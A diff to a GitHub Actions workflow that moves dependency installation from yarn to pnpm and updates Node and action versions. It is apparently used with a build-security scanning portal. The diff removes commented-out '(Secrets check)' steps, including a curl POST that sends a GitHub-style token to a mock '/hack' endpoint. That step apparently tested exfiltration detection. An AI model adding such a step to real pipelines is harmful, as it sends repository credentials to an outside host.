@@ -68,11 +68,8 @@ jobs:
           INVISIRISK_PORTAL: https://app.stage.veribom.com/
           GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }} 
     container:
-      image: node:18-buster
+      image: node:18.15.0
       options: --cap-add=NET_ADMIN --privileged
-    strategy:
-      matrix:
-        node-version: [18.x]
     steps:
     - name: Install curl
       run: |
@@ -87,26 +84,26 @@ jobs:
           github-token: ${{ secrets.GITHUB_TOKEN }}
           SCAN_ID: ${{ needs.create_scan_in_IR_Portal.outputs.scan_id }}
     - name: Checkout the code
-      uses: actions/checkout@v3
-    - name: Use Node.js ${{ matrix.node-version }}
-      uses: actions/setup-node@v3
+      uses: actions/checkout@v4
+      
+    # Setup pnpm as package manager
+    - uses: pnpm/action-setup@v3
       with:
-        node-version: ${{ matrix.node-version }}
-
- #   - name: (Secrets check) Send POST request with GitHub token
-#      run: |
-  #        curl -k -X POST https://vbirmock.free.beeceptor.com/hack \
-#            -H "Content-Type: application/json" \
-  #          -d '{
-   #         "GH": "ghp_DEFzmg7RHrQ2eMe2IF4NxNWQodYpab3VMXXX"
-  #        }'
-  #  - name: (Secrets check) Make API Request
- #     run: |
-  #      curl -k -X POST https://api.github.com/endpoint \
-  #      -d '{"name": "ghp_1234567890abcdef1234567890abcdef12345678", "description": "A description of my repository"}'
+        version: 9.0.4
         
-    - name: install dependencies
-   # run: pip install -r requirements.txt
-      run: yarn install
-    # - run: npm run build --if-present
-    # - run: npm test
+    - name: Use Node.js 18.15.0
+      uses: actions/setup-node@v4
+      with:
+        node-version: 18.15.0
+        cache: 'pnpm'
+        cache-dependency-path: 'pnpm-lock.yaml'
+        
+    # Install dependencies using pnpm instead of npm
+    - name: Install dependencies
+      run: pnpm install
+      
+    # Add lint step if you have linting configured
+    # - run: pnpm lint
+    
+    # Build the project
+    - run: pnpm build
